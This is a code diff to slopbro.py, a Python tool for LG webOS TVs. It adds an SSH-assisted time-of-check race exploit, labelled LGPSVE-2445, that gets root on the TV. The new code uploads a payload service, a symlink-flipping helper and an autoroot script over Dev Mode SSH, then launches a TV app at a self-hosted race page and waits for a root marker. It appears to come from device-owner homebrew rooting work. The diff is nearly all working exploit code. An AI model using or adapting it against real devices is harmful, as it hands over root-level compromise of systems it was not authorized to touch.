@@ -10,8 +10,8 @@
 slopbro.py - Connect to an LG webOS TV over SSAP, pair, and
 launch various apps with a self-hosted payload page.
 
-Single file, standard library only. Requires Python 3.8 or newer and should be
-run on a PC on the same LAN as the TV.
+Standard library only. Requires Python 3.8 or newer and should be run on
+a PC on the same LAN as the TV. Keep the accompanying wwwroot directory.
 
 Example:
     python3 slopbro.py 192.168.1.50
@@ -27,13 +27,16 @@ import os
 import posixpath
 import socket
 import ssl
+import subprocess
+import shlex
+import secrets
 import struct
 import sys
 import threading
 import time
 from hashlib import sha1
 from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
-from urllib.parse import unquote, urlsplit
+from urllib.parse import unquote, urlsplit, urlencode
 
 WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 
@@ -77,6 +80,8 @@ TEST_SERVER_MODES = (TEST_SERVER_SIMPLE, TEST_SERVER_PAYLOAD)
 # Should exist on all targeted webOS versions.
 DEFAULT_FAKE_SERVICE_PATH = "/usr/palm/services/com.palm.service.devmode"
 
+# This directory edition ships with no embedded assets. The upstream packaging
+# markers remain for original-mode compatibility; race mode always uses wwwroot.
 # --- BEGIN EMBEDDED WWWROOT ---
 EMBEDDED_WWWROOT = {}
 # --- END EMBEDDED WWWROOT ---
@@ -1148,6 +1153,552 @@ def run(
                 pass
 
 
+# ---------------------------------------------------------------------------
+# LGPSVE-2445 TOCTOU race mode (SSH-assisted, no helper IPK required).
+# ---------------------------------------------------------------------------
+
+RACE_ENTRY_PAGE = "race.html"
+RACE_DEFAULT_TRUSTED = "/usr/palm/services/com.palm.service.devmode"
+
+
+class RaceError(Exception):
+    pass
+
+
+def _shq(value):
+    return shlex.quote(str(value))
+
+
+class SSHRunner:
+    def __init__(self, host, user="prisoner", port=9922, key=None, options=None):
+        self.destination = "%s@%s" % (user, host)
+        self.args = [
+            "ssh", "-p", str(port),
+            "-o", "BatchMode=yes",
+            "-o", "ConnectTimeout=10",
+        ]
+        if key:
+            self.args += ["-i", os.path.abspath(os.path.expanduser(key))]
+        for option in options or []:
+            self.args += ["-o", option]
+
+    def run(self, command, stdin=None, timeout=40, check=True):
+        try:
+            proc = subprocess.run(
+                self.args + [self.destination, command],
+                input=stdin,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=timeout,
+            )
+        except FileNotFoundError:
+            raise RaceError("system ssh client was not found")
+        except subprocess.TimeoutExpired:
+            raise RaceError("SSH command timed out: %s" % command)
+        if check and proc.returncode != 0:
+            raise RaceError(
+                "SSH command failed (%d): %s\nstdout: %s\nstderr: %s"
+                % (
+                    proc.returncode,
+                    command,
+                    proc.stdout.decode("utf-8", "replace")[-2000:],
+                    proc.stderr.decode("utf-8", "replace")[-2000:],
+                )
+            )
+        return proc
+
+    def put(self, path, data):
+        if isinstance(data, str):
+            data = data.encode("utf-8")
+        self.run("cat > %s" % _shq(path), stdin=data)
+
+    def exists(self, path):
+        proc = self.run("[ -e %s ]" % _shq(path), check=False)
+        return proc.returncode == 0
+
+    def read(self, path, limit=12000):
+        proc = self.run(
+            "tail -c %d %s" % (int(limit), _shq(path)), check=False
+        )
+        return proc.stdout.decode("utf-8", "replace")
+
+    def pid_alive(self, pid_path):
+        proc = self.run(
+            "test -f %s && kill -0 $(cat %s) 2>/dev/null"
+            % (_shq(pid_path), _shq(pid_path)),
+            check=False,
+        )
+        return proc.returncode == 0
+
+
+class RaceState:
+    def __init__(self):
+        self._lock = threading.Lock()
+        self.root = False
+        self.stop = False
+        self.final = None
+        self.progress = None
+
+    def status(self):
+        with self._lock:
+            return {"root": self.root, "stop": self.stop}
+
+    def request_stop(self, root=False):
+        with self._lock:
+            self.stop = True
+            if root:
+                self.root = True
+
+    def report(self, report):
+        with self._lock:
+            self.progress = report
+            if report.get("final"):
+                self.final = report
+
+
+def make_race_http_handler(state):
+    class RaceHandler(BaseHTTPRequestHandler):
+        def _send(self, status, data, content_type):
+            if isinstance(data, str):
+                data = data.encode("utf-8")
+            self.send_response(status)
+            self.send_header("Content-Type", content_type)
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(data)
+
+        def do_GET(self):
+            path = urlsplit(self.path).path
+            if path == "/status":
+                self._send(200, json.dumps(state.status()), "application/json")
+                return
+            if path in ("/", "/" + RACE_ENTRY_PAGE):
+                data = read_wwwroot_file(RACE_ENTRY_PAGE)
+                if data is None:
+                    self._send(500, "race page is missing", "text/plain")
+                    return
+                self._send(200, data, "text/html; charset=utf-8")
+                return
+            self._send(404, "not found", "text/plain")
+
+        def do_POST(self):
+            path = urlsplit(self.path).path
+            if path != "/report":
+                self._send(404, "not found", "text/plain")
+                return
+            try:
+                length = int(self.headers.get("Content-Length", "0"))
+                if length <= 0 or length > 262144:
+                    raise ValueError("invalid report size")
+                report = json.loads(self.rfile.read(length).decode("utf-8"))
+                if not isinstance(report, dict):
+                    raise ValueError("report is not an object")
+                state.report(report)
+                if report.get("final"):
+                    log("race page finished: %s; counts=%s" % (
+                        report.get("reason", "unknown"),
+                        json.dumps(report.get("counts", {}), sort_keys=True),
+                    ))
+                self._send(200, "{}", "application/json")
+            except Exception as exc:
+                self._send(400, str(exc), "text/plain")
+
+        def log_message(self, fmt, *args):
+            pass
+
+    return RaceHandler
+
+
+def start_race_http_server(state):
+    return _start_http_server(make_race_http_handler(state), "0.0.0.0", 8080)
+
+
+RACE_FLIPPER_JS_FILE = "flipper.js"
+RACE_FLIPPER_SH_FILE = "flipper.sh"
+RACE_SERVICE_FILE = "race-service.js"
+RACE_REQUIRED_FILES = [
+    RACE_ENTRY_PAGE,
+    RACE_FLIPPER_JS_FILE,
+    RACE_FLIPPER_SH_FILE,
+    RACE_SERVICE_FILE,
+    SHELL_SCRIPT,
+]
+
+
+def read_wwwroot_file(rel_path):
+    """Read a required runtime asset from the real wwwroot directory."""
+    root_dir = resolve_wwwroot_path()
+    data = _read_filesystem_file(root_dir, rel_path)
+    if data is None:
+        raise RaceError("required wwwroot file is missing: %s" % rel_path)
+    return data
+
+
+def require_race_assets():
+    missing = []
+    for rel_path in RACE_REQUIRED_FILES:
+        if _read_filesystem_file(resolve_wwwroot_path(), rel_path) is None:
+            missing.append(rel_path)
+    if missing:
+        raise RaceError(
+            "race mode requires external wwwroot files; missing: %s"
+            % ", ".join(missing)
+        )
+
+
+
+def make_race_root_payload(base, wrapper):
+    template = read_wwwroot_file(RACE_SERVICE_FILE).decode("utf-8")
+    base_token = "__SLOPBRO_RACE_BASE__"
+    wrapper_token = "__SLOPBRO_AUTOROOT_WRAPPER__"
+    if template.count(base_token) != 1 or template.count(wrapper_token) != 1:
+        raise RaceError("invalid race-service.js template placeholders")
+    # The tokens occur inside JavaScript string literals. Escape the values
+    # without adding another pair of quotes so the template remains valid JS.
+    payload = template.replace(base_token, json.dumps(base)[1:-1])
+    payload = payload.replace(wrapper_token, json.dumps(wrapper)[1:-1])
+    if "__SLOPBRO_" in payload:
+        raise RaceError("unexpanded placeholder in race-service.js")
+    return payload
+
+
+class RaceManager:
+    def __init__(
+        self,
+        ssh,
+        base,
+        attempts,
+        trusted,
+        app_id=None,
+        debug=False,
+        curl_insecure=False,
+        hbchannel_ipk=None,
+        keep_files=False,
+    ):
+        self.ssh = ssh
+        self.base = base
+        self.attempts = attempts
+        self.trusted = trusted
+        self.app_id = app_id or trusted.rstrip('/').rsplit('/', 1)[-1]
+        self.debug = debug
+        self.curl_insecure = curl_insecure
+        self.hbchannel_ipk = hbchannel_ipk
+        self.keep_files = keep_files
+        self.payload = base + "/payload"
+        self.autoroot = base + "/autoroot.sh"
+        self.wrapper = base + "/run-autoroot.sh"
+        self.pid_file = base + "/helper.pid"
+        self.ready_file = base + "/helper.ready"
+        self.root_flag = base + "/rooted.flag"
+        self.autoroot_done = base + "/autoroot.done"
+        self.autoroot_log = base + "/autoroot.log"
+
+    def prepare(self):
+        if self.ssh.exists(self.base):
+            raise RaceError("race directory already exists: %s" % self.base)
+        self.ssh.run(
+            "mkdir -p %s && chmod 777 %s && chmod 755 %s"
+            % (_shq(self.payload), _shq(self.base), _shq(self.payload))
+        )
+
+        self.ssh.put(self.payload + "/service.js", make_race_root_payload(self.base, self.wrapper))
+        self.ssh.put(
+            self.payload + "/package.json",
+            json.dumps({"name": self.app_id, "main": "service.js"}) + "\n",
+        )
+        self.ssh.put(
+            self.payload + "/services.json",
+            json.dumps({
+                "id": self.app_id,
+                "services": [{"name": self.app_id}],
+            }) + "\n",
+        )
+        self.ssh.put(self.payload + "/flipper.js", read_wwwroot_file(RACE_FLIPPER_JS_FILE))
+        self.ssh.put(self.base + "/flipper.sh", read_wwwroot_file(RACE_FLIPPER_SH_FILE))
+        self.ssh.put(self.autoroot, read_wwwroot_file(SHELL_SCRIPT))
+
+        if self.hbchannel_ipk:
+            try:
+                with open(self.hbchannel_ipk, "rb") as fh:
+                    ipk_data = fh.read()
+            except OSError as exc:
+                raise RaceError("cannot read Homebrew Channel IPK: %s" % exc)
+            self.ssh.put(self.base + "/hbchannel.ipk", ipk_data)
+
+        flags = []
+        if self.debug:
+            flags.append("--debug")
+        if self.curl_insecure:
+            flags.append("--curl-insecure")
+        flag_text = " ".join(_shq(f) for f in flags)
+        wrapper = """#!/bin/sh
+IPK_SRC=%s sh %s %s >%s 2>&1
+echo $? >%s
+""" % (
+            _shq(self.base + "/hbchannel.ipk"),
+            _shq(self.autoroot),
+            flag_text,
+            _shq(self.autoroot_log),
+            _shq(self.autoroot_done),
+        )
+        self.ssh.put(self.wrapper, wrapper)
+        self.ssh.run(
+            "chmod 644 %s %s %s %s %s %s && ln -s %s %s"
+            % (
+                _shq(self.payload + "/service.js"),
+                _shq(self.payload + "/package.json"),
+                _shq(self.payload + "/services.json"),
+                _shq(self.autoroot),
+                _shq(self.wrapper),
+                _shq(self.payload + "/flipper.js"),
+                _shq(self.trusted),
+                _shq(self.base + "/k3static"),
+            )
+        )
+
+    def start_flipper(self):
+        proc = self.ssh.run(
+            "if [ -x /usr/bin/node ]; then printf '/usr/bin/node'; "
+            "elif command -v node >/dev/null 2>&1; then command -v node; fi"
+        )
+        node = proc.stdout.decode("ascii", "ignore").strip()
+        args = "%s %d %s %s" % (
+            _shq(self.base), self.attempts, _shq(self.trusted), _shq(self.payload)
+        )
+        if node:
+            node_test = self.ssh.run(_shq(node) + " -e 'process.exit(0)'", check=False)
+            if node_test.returncode != 0:
+                log("Node.js is present but failed to execute; using shell fallback")
+                node = ""
+        if node:
+            log("using Node.js flipper: %s" % node)
+            command = "nohup %s %s %s >>%s 2>&1 </dev/null & echo $! >%s" % (
+                _shq(node), _shq(self.payload + "/flipper.js"), args,
+                _shq(self.base + "/helper.log"), _shq(self.pid_file),
+            )
+        else:
+            log("Node.js is unavailable; testing shell flipper with atomic mv -T")
+            test_dir = self.base + "/mv-test"
+            self.ssh.run(
+                "mkdir %s && touch %s/a && mv -fT %s/a %s/b && rm -rf %s"
+                % (_shq(test_dir), _shq(test_dir), _shq(test_dir),
+                   _shq(test_dir), _shq(test_dir))
+            )
+            command = "nohup sh %s %s >>%s 2>&1 </dev/null & echo $! >%s" % (
+                _shq(self.base + "/flipper.sh"), args,
+                _shq(self.base + "/helper.log"), _shq(self.pid_file),
+            )
+        self.ssh.run(command)
+
+    def wait_until_ready(self, timeout=60):
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            if self.ssh.exists(self.ready_file):
+                first = self.ssh.exists(self.base + "/k3u0")
+                last = self.ssh.exists(self.base + "/k3u%d" % (self.attempts - 1))
+                if first and last:
+                    log("flipper is ready; all unique symlinks were created")
+                    return
+            if self.ssh.exists(self.base + "/helper.error"):
+                raise RaceError("flipper failed:\n" + self.log_tail("helper.log"))
+            if not self.ssh.pid_alive(self.pid_file):
+                raise RaceError("flipper exited before readiness:\n" + self.log_tail("helper.log"))
+            time.sleep(0.35)
+        raise RaceError("timed out waiting for flipper readiness:\n" + self.log_tail("helper.log"))
+
+    def rooted(self):
+        return self.ssh.exists(self.root_flag)
+
+    def helper_alive(self):
+        return self.ssh.pid_alive(self.pid_file)
+
+    def autoroot_exit_code(self):
+        if not self.ssh.exists(self.autoroot_done):
+            return None
+        text = self.ssh.read(self.autoroot_done, 100).strip()
+        try:
+            return int(text.splitlines()[-1])
+        except (ValueError, IndexError):
+            raise RaceError("invalid autoroot status: %r" % text)
+
+    def log_tail(self, name="helper.log", limit=5000):
+        return self.ssh.read(self.base + "/" + name, limit)[-limit:]
+
+    def cleanup(self):
+        try:
+            self.ssh.run("touch %s" % _shq(self.base + "/stop.flag"), check=False)
+            self.ssh.run(
+                "if [ -f %s ]; then kill $(cat %s) 2>/dev/null || true; fi"
+                % (_shq(self.pid_file), _shq(self.pid_file)),
+                check=False,
+            )
+            if not self.keep_files:
+                self.ssh.run("rm -rf %s" % _shq(self.base), check=False)
+                log("remote race files removed: %s" % self.base)
+            else:
+                log("remote race files preserved: %s" % self.base)
+        except RaceError as exc:
+            log("warning: race cleanup failed: %s" % exc)
+
+
+def race_page_url(host, port, base, attempts, trusted, local_ip_override=None):
+    local_ip = local_ip_override or local_ip_for_remote(host)
+    query = urlencode({"base": base, "attempts": attempts, "trusted": trusted})
+    return "http://%s:%d/%s?%s" % (local_ip, port, RACE_ENTRY_PAGE, query)
+
+
+def _race_result_counts(state):
+    report = state.final or state.progress or {}
+    return report.get("counts", {})
+
+
+def run_race(
+    host,
+    debug=False,
+    local_ip_override=None,
+    webos_version_override=None,
+    curl_insecure=False,
+    attempts=1000,
+    batches=1,
+    race_timeout=180,
+    autoroot_timeout=300,
+    ssh_user="prisoner",
+    ssh_port=9922,
+    ssh_key=None,
+    ssh_options=None,
+    trusted=RACE_DEFAULT_TRUSTED,
+    race_app_id=None,
+    hbchannel_ipk=None,
+    keep_files=False,
+):
+    if attempts < 1 or batches < 1:
+        raise RaceError("attempts and batches must be positive")
+    require_race_assets()
+    if not trusted.startswith("/usr/palm/services/"):
+        raise RaceError("trusted service must be below /usr/palm/services/")
+
+    ssh = SSHRunner(host, ssh_user, ssh_port, ssh_key, ssh_options)
+    ssh.run("printf 'ssh-ok'")
+    log("Dev Mode SSH connection succeeded")
+
+    ws = None
+    client = None
+    http_server = None
+    manager = None
+    state = None
+    try:
+        ws = WebSocket.connect(host, PORT_TLS, secure=True)
+        client = SSAPClient(ws)
+        stored_key = load_client_key(host)
+        new_key = client.register(stored_key, DEFAULT_MANIFEST)
+        if new_key and new_key != stored_key:
+            save_client_key(host, new_key)
+        log("SSAP registration succeeded")
+
+        target_apps = target_apps_for_webos_version(TARGET_APPS, webos_version_override)
+        if not target_apps:
+            raise RaceError("no target apps configured for this webOS version")
+        app_id, url_param_name = verify_app_present(client, target_apps)
+
+        for batch in range(batches):
+            run_id = "%d-%s" % (int(time.time()), secrets.token_hex(4))
+            base = "/tmp/slopbro-race-" + run_id
+            state = RaceState()
+            manager = RaceManager(
+                ssh, base, attempts, trusted, race_app_id, debug, curl_insecure,
+                hbchannel_ipk, keep_files,
+            )
+            log("race batch %d/%d; directory=%s" % (batch + 1, batches, base))
+            try:
+                manager.prepare()
+                manager.start_flipper()
+                manager.wait_until_ready()
+                http_server = start_race_http_server(state)
+                page_url = race_page_url(
+                    host, http_server.server_port, base, attempts, trusted,
+                    local_ip_override,
+                )
+                log("launching %s -> %s" % (app_id, page_url))
+                launch_app(client, app_id, {url_param_name: page_url})
+
+                deadline = time.time() + race_timeout
+                rooted = False
+                while time.time() < deadline:
+                    if manager.rooted():
+                        rooted = True
+                        state.request_stop(root=True)
+                        log("ROOT CONFIRMED by root-only marker")
+                        break
+                    if state.final is not None:
+                        break
+                    if not manager.helper_alive() and state.final is None:
+                        raise RaceError("flipper exited during race:\n" + manager.log_tail())
+                    time.sleep(0.3)
+
+                if not rooted and manager.rooted():
+                    rooted = True
+                    state.request_stop(root=True)
+                if rooted:
+                    log("waiting for autoroot.sh to finish")
+                    autoroot_deadline = time.time() + autoroot_timeout
+                    exit_code = None
+                    while time.time() < autoroot_deadline:
+                        exit_code = manager.autoroot_exit_code()
+                        if exit_code is not None:
+                            break
+                        time.sleep(1.0)
+                    if exit_code is None:
+                        raise RaceError("root obtained, but autoroot timed out:\n" + manager.log_tail("autoroot.log"))
+                    if exit_code != 0:
+                        raise RaceError("root obtained, but autoroot exited %d:\n%s" % (
+                            exit_code, manager.log_tail("autoroot.log")
+                        ))
+                    result = {
+                        "returnValue": True,
+                        "root": True,
+                        "autorootExitCode": exit_code,
+                        "batch": batch + 1,
+                        "attemptsReported": _race_result_counts(state),
+                    }
+                    print(json.dumps(result, sort_keys=True))
+                    log("rooting and autoroot completed successfully")
+                    return result
+
+                counts = _race_result_counts(state)
+                log("race batch did not obtain root; counts=%s" % json.dumps(counts, sort_keys=True))
+                if state.final is None:
+                    log("race batch timed out")
+                elif state.final.get("reason", "").startswith("precheck"):
+                    raise RaceError("race precheck failed: %s" % state.final.get("reason"))
+            finally:
+                if state is not None:
+                    state.request_stop(root=False)
+                if http_server is not None:
+                    http_server.shutdown()
+                    http_server.server_close()
+                    http_server = None
+                if manager is not None:
+                    if debug or keep_files:
+                        log("helper log tail:\n" + manager.log_tail())
+                    manager.cleanup()
+                manager = None
+
+        raise RaceError("all race batches completed without a root marker")
+    finally:
+        if state is not None:
+            state.request_stop(root=False)
+        if http_server is not None:
+            http_server.shutdown()
+            http_server.server_close()
+        if manager is not None:
+            manager.cleanup()
+        if client is not None:
+            client.close()
+        elif ws is not None:
+            ws.close()
+
+
 def _fake_service_path_arg(value):
     if not value.strip():
         raise argparse.ArgumentTypeError("value must not be empty")
@@ -1197,6 +1748,58 @@ def main(argv=None):
         help="serve a connectivity response (simple) or payload without pairing",
     )
     parser.add_argument(
+        "--race-lgpsve2445", action="store_true",
+        help="use the SSH-assisted TOCTOU bypass for the realpath jsserver patch",
+    )
+    parser.add_argument(
+        "--race-attempts", type=int, default=1000, metavar="<n>",
+        help="unique race pathnames per batch (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-batches", type=int, default=1, metavar="<n>",
+        help="fresh race directories/batches to try (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-timeout", type=int, default=180, metavar="<seconds>",
+        help="maximum time per race batch (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--autoroot-timeout", type=int, default=300, metavar="<seconds>",
+        help="maximum autoroot.sh runtime after root (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-ssh-user", default="prisoner", metavar="<user>",
+        help="Dev Mode SSH user (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-ssh-port", type=int, default=9922, metavar="<port>",
+        help="Dev Mode SSH port (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-ssh-key", metavar="<path>",
+        help="private key for Dev Mode SSH (default: ssh agent/default keys)",
+    )
+    parser.add_argument(
+        "--race-ssh-option", action="append", default=[], metavar="<option>",
+        help="extra OpenSSH -o option; may be repeated",
+    )
+    parser.add_argument(
+        "--race-trusted", default=RACE_DEFAULT_TRUSTED, metavar="<path>",
+        help="existing trusted service directory (default: %(default)s)",
+    )
+    parser.add_argument(
+        "--race-app-id", metavar="<id>",
+        help="appId shared by trusted/payload metadata (default: trusted basename)",
+    )
+    parser.add_argument(
+        "--hbchannel-ipk", metavar="<path>",
+        help="optional clean Homebrew Channel IPK to upload for autoroot",
+    )
+    parser.add_argument(
+        "--race-keep-files", action="store_true",
+        help="preserve remote race directory and logs after each batch",
+    )
+    parser.add_argument(
         "host", nargs="?", metavar="<tv-ip-or-host>",
         help="TV address (required except in test-server modes; recommended there)",
     )
@@ -1207,8 +1810,37 @@ def main(argv=None):
         parser.error("--webos-version value must not be empty")
     if args.test_server is None and args.host is None:
         parser.error("<tv-ip-or-host> is required unless --test-server is used")
+    if args.race_lgpsve2445 and args.test_server is not None:
+        parser.error("--race-lgpsve2445 cannot be combined with --test-server")
+    if args.race_attempts < 1 or args.race_batches < 1:
+        parser.error("--race-attempts and --race-batches must be positive")
+    if args.race_timeout < 1 or args.autoroot_timeout < 1:
+        parser.error("race timeouts must be positive")
 
-    if args.test_server == TEST_SERVER_SIMPLE:
+    if args.race_lgpsve2445:
+        try:
+            run_race(
+                args.host,
+                debug=args.debug,
+                local_ip_override=args.local_ip,
+                webos_version_override=args.webos_version,
+                curl_insecure=args.curl_insecure,
+                attempts=args.race_attempts,
+                batches=args.race_batches,
+                race_timeout=args.race_timeout,
+                autoroot_timeout=args.autoroot_timeout,
+                ssh_user=args.race_ssh_user,
+                ssh_port=args.race_ssh_port,
+                ssh_key=args.race_ssh_key,
+                ssh_options=args.race_ssh_option,
+                trusted=args.race_trusted,
+                race_app_id=args.race_app_id,
+                hbchannel_ipk=args.hbchannel_ipk,
+                keep_files=args.race_keep_files,
+            )
+        except RaceError as exc:
+            die(str(exc))
+    elif args.test_server == TEST_SERVER_SIMPLE:
         run_test_connection(
             args.host,
             local_ip_override=args.local_ip,
